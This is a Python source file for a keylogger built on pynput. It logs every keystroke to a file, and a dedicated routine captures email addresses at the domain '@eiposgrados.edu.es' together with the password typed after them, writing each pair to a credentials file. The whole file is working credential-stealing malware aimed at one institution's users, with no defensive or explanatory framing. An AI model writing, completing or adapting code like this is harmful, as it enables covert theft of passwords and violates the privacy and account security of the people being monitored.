import re
import subprocess

from pynput import keyboard as kb

_hex_pattern = re.compile(r'0x[\dA-Fa-f]+')


def _current_window_id():
    return int(
        _hex_pattern.findall(
            subprocess.run(
                'xprop -root _NET_ACTIVE_WINDOW'.split(' '),
                capture_output=True
            ).stdout.decode('ascii')
        )[0],
        0
    )


class Processor:
    __buffer_limit = 256
    __display_map = {
        kb.Key.space: ' ',
        kb.Key.tab: '\t',
        kb.Key.enter: '\n',
        kb.Key.backspace: '\b'
    }

    def __init__(self, log_file, credential_file):
        self.__window_id = _current_window_id()
        self.__buffer = []
        self.__listener = kb.Listener(on_press=self.__press_callback())
        self.__paths = {
            'credentials': credential_file,
            'logs': log_file
        }
        self.__logs = None
        self.__previous_key = None
        self.__current_credentials = {}

    def record(self):
        with self.__listener, open(self.__paths['logs'], 'a', encoding='utf-8') as fp:
            try:
                self.__logs = fp
                self.__listener.join()

            except KeyboardInterrupt:
                self.__listener.stop()
                print()

    def __detect_eip_password(self):
        text = ''.join(self.__buffer)
        if '@eiposgrados.edu.es' in text and self.__current_credentials.get('email') is None:
            self.__current_credentials['email'] = text

        elif self.__current_credentials.get('email') is not None:
            self.__current_credentials['password'] = text
            with open(self.__paths['credentials'], 'a', encoding='utf-8') as fp:
                fp.write(' '.join(
                    [
                        self.__current_credentials['email'],
                        self.__current_credentials['password']
                    ]
                ))
                fp.write('\n')

            self.__current_credentials.clear()

        self.__buffer.clear()

    def __combine(self, key):
        combined = key
        if self.__previous_key is not None:
            if isinstance(self.__previous_key, kb.Key) and isinstance(key, kb.KeyCode):
                if all([
                    self.__previous_key in (kb.Key.alt_r, kb.Key.alt_gr),
                    self.__listener.canonical(key).char == '2'
                ]):
                    combined = kb.KeyCode(char='@')

                elif all([
                    self.__previous_key in (kb.Key.ctrl, kb.Key.ctrl_l, kb.Key.ctrl_r),
                    self.__listener.canonical(key).char == 'c'
                ]):
                    if _current_window_id() == self.__window_id:
                        raise KeyboardInterrupt

            elif isinstance(self.__previous_key, kb.KeyCode) and self.__previous_key.is_dead:
                combined = self.__previous_key.join(key)

            self.__previous_key = None

        return combined

    def __press_callback(self):
        def on_press(key):
            if len(self.__buffer) > self.__buffer_limit:
                self.__buffer.clear()

            current_key = None
            if key in (kb.Key.alt_gr, kb.Key.alt_r, kb.Key.ctrl, kb.Key.ctrl_l, kb.Key.ctrl_r):
                self.__previous_key = key

            elif isinstance(key, kb.Key) and key in self.__display_map:
                current_key = self.__display_map[key]
                if key == kb.Key.backspace and len(self.__buffer) > 0:
                    self.__buffer.pop()

                elif len(self.__buffer) > 0:
                    self.__detect_eip_password()

            elif isinstance(key, kb.KeyCode):
                if key.is_dead:
                    self.__previous_key = key

                else:
                    current_key = self.__combine(key).char
                    self.__buffer.append(current_key)

            if current_key is not None:
                print(current_key, end='', flush=True)
                self.__logs.write(current_key)

        return on_press
